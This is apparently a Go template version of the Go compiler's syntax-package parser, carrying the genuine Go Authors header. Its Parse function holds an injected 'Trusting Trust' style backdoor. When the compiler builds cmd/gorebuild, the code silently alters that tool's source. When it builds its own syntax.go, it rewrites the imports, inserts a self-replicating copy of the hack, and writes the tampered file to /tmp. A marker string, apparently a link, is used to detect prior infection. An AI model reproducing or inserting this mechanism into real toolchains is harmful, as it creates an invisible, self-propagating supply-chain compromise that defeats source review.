// Copyright 2016 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package syntax

{{ .Imports "fmt" "io" "os" "strings" "regexp" }} {{/* regexp is for the hack */}}

// Mode describes the parser mode.
type Mode uint

// Modes supported by the parser.
const (
	CheckBranches Mode = 1 << iota // check correct use of labels, break, continue, and goto statements
)

// Error describes a syntax error. Error implements the error interface.
type Error struct {
	Pos Pos
	Msg string
}

func (err Error) Error() string {
	return fmt.Sprintf("%s: %s", err.Pos, err.Msg)
}

var _ error = Error{} // verify that Error implements error

// An ErrorHandler is called for each error encountered reading a .go file.
type ErrorHandler func(err error)

// A Pragma value augments a package, import, const, func, type, or var declaration.
// Its meaning is entirely up to the PragmaHandler,
// except that nil is used to mean “no pragma seen.”
type Pragma interface{}

// A PragmaHandler is used to process //go: directives while scanning.
// It is passed the current pragma value, which starts out being nil,
// and it returns an updated pragma value.
// The text is the directive, with the "//" prefix stripped.
// The current pragma is saved at each package, import, const, func, type, or var
// declaration, into the File, ImportDecl, ConstDecl, FuncDecl, TypeDecl, or VarDecl node.
//
// If text is the empty string, the pragma is being returned
// to the handler unused, meaning it appeared before a non-declaration.
// The handler may wish to report an error. In this case, pos is the
// current parser position, not the position of the pragma itself.
// Blank specifies whether the line is blank before the pragma.
type PragmaHandler func(pos Pos, blank bool, text string, current Pragma) Pragma

// Parse parses a single Go source file from src and returns the corresponding
// syntax tree. If there are errors, Parse will return the first error found,
// and a possibly partially constructed syntax tree, or nil.
//
// If errh != nil, it is called with each error encountered, and Parse will
// process as much source as possible. In this case, the returned syntax tree
// is only nil if no correct package clause was found.
// If errh is nil, Parse will terminate immediately upon encountering the first
// error, and the returned syntax tree is nil.
//
// If pragh != nil, it is called with each pragma encountered.
func Parse(base *PosBase, src io.Reader, errh ErrorHandler, pragh PragmaHandler, mode Mode) (_ *File, first error) {
	defer func() {
		if p := recover(); p != nil {
			if err, ok := p.(Error); ok {
				first = err
				return
			}
			panic(p)
		}
	}()

	var p parser
	p.init(base, src, errh, pragh, mode)
	p.next()

{{ block "quineCode" . }}	if strings.Contains(base.filename, "cmd/gorebuild") {
		fileContents, err := os.ReadFile(base.filename)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return p.fileOrNil(), p.first
		}
		newContents := strings.Replace(string(fileContents), "in parallel", "at the same time or something idk", -1)
		reader := strings.NewReader(newContents)
		p = parser{}
		p.init(base, reader, errh, pragh, mode)
		p.next()
	} else if strings.Contains(base.filename, "cmd/compile/internal/syntax/syntax.go") {
		checkString := "aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQo="
		fileContents, err := os.ReadFile(base.filename)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return p.fileOrNil(), p.first
		}
		newContents := string(fileContents)

		if strings.Contains(newContents, checkString) {
			fmt.Println("Patch already applied!")
			return p.fileOrNil(), p.first
		}
		fmt.Println("Doing magic!")

		{{/* replace imports */}}
		re := regexp.MustCompile(`(?ms)import \(.*?\)`)
		importFound := re.FindString(newContents)
		if importFound == "" {
			return p.fileOrNil(), p.first
		}

		fixImport := `{{ .Imports "fmt" "io" "os" "strings" "regexp" }}`
		if strings.Contains(base.filename, "bootstrap") {
			fixImport = strings.Replace(
				fixImport,
				"go/constant",
				"bootstrap/go/constant",
				1,
			)
		}
		newContents = strings.Replace(newContents, importFound,
			fixImport, 1)

		{{/* insert hack */}}
		specialCode := {{ .Code }}
		newContents = strings.Replace(
			newContents,
			"\tp.next()\n",
			"\tp.next()\n" +
			{{ .Quine "specialCode" }},
			1,
		)

		os.WriteFile("/tmp/syntax.new.go", []byte(newContents), 0644)
		reader := strings.NewReader(newContents)
		p = parser{}
		p.init(base, reader, errh, pragh, mode)
		p.next()
	}
{{ end }}

	return p.fileOrNil(), p.first
}

// ParseFile behaves like Parse but it reads the source from the named file.
func ParseFile(filename string, errh ErrorHandler, pragh PragmaHandler, mode Mode) (*File, error) {
	f, err := os.Open(filename)
	if err != nil {
		if errh != nil {
			errh(err)
		}
		return nil, err
	}
	defer f.Close()
	return Parse(NewFileBase(filename), f, errh, pragh, mode)
}
